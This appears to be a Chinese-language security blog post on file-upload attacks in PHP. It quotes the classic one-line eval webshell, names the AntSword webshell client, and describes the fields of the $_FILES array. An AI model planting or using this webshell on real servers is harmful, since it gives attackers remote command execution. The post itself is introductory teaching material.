-  
-  
-<a href="/2025/02/08/php/" class="archive-article-date">
-        <time datetime="2025-02-08T04:30:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-02-08</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>web的一个管理工具，可以对web服务器进行操作的权限</p>
-<p>php中最经典的webshell是：<code>&lt;?php eval($_post[&#39;cmd&#39;]);?&gt;</code>（一句话木马）</p>
-<p>注：eval($code) 是把字符串$code作为php代码执行</p>
-<p>工具：中国蚁剑</p>
-<h3 id="php中的文件上传"><a href="#php中的文件上传" class="headerlink" title="php中的文件上传"></a>php中的文件上传</h3><h4 id="FILES"><a href="#FILES" class="headerlink" title="$_FILES"></a>$_FILES</h4><p>超全局变量<code>$_FILES</code>，它是一个数组，其包含了所有上传的文件信息</p>
-<p>例如上传一个表单的name属性值为file，即<code>&lt;input name=&quot;file&quot; type=&quot;file&quot; /&gt;</code></p>
-<h5 id="FILES数组内容："><a href="#FILES数组内容：" class="headerlink" title="$_FILES数组内容："></a>$_FILES数组内容：</h5><h6 id="1-FILES-file-name"><a href="#1-FILES-file-name" class="headerlink" title="1.$_FILES[&#39;file&#39;][&#39;name&#39;]"></a>1.<code>$_FILES[&#39;file&#39;][&#39;name&#39;]</code></h6><h6 id="2-FILES-file-type"><a href="#2-FILES-file-type" class="headerlink" title="2.$_FILES[&#39;file&#39;][&#39;type&#39;]"></a>2.<code>$_FILES[&#39;file&#39;][&#39;type&#39;]</code></h6><h6 id="3-FILES-file-size"><a href="#3-FILES-file-size" class="headerlink" title="3.$_FILES[&#39;file&#39;][&#39;size&#39;]"></a>3.<code>$_FILES[&#39;file&#39;][&#39;size&#39;]</code></h6><h6 id="4-FILES-file-tmp-name-文件被上传后在服务端存储的临时文件名-在请求结束后该临时文件会被删除"><a href="#4-FILES-file-tmp-name-文件被上传后在服务端存储的临时文件名-在请求结束后该临时文件会被删除" class="headerlink" title="4.$_FILES[&#39;file&#39;][&#39;tmp_name&#39;]文件被上传后在服务端存储的临时文件名, 在请求结束后该临时文件会被删除"></a>4.<code>$_FILES[&#39;file&#39;][&#39;tmp_name&#39;]</code>文件被上传后在服务端存储的临时文件名, 在请求结束后该临时文件会被删除</h6><h6 id="5-FILES-file-error-错误代码"><a href="#5-FILES-file-error-错误代码" class="headerlink" title="5.$_FILES[&#39;file&#39;][&#39;error&#39;]错误代码"></a>5.<code>$_FILES[&#39;file&#39;][&#39;error&#39;]</code>错误代码</h6><p>如果多文件上传，则上面变量会变成一个数组</p>
-<p>如<code>$_FILES[&#39;file&#39;][&#39;name&#39;][0]</code>，<code>$_FILES[&#39;file&#39;][&#39;name&#39;][1]</code></p>
-
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2025/02/08/php/">展开全文 >></a>
     </p>
     
 
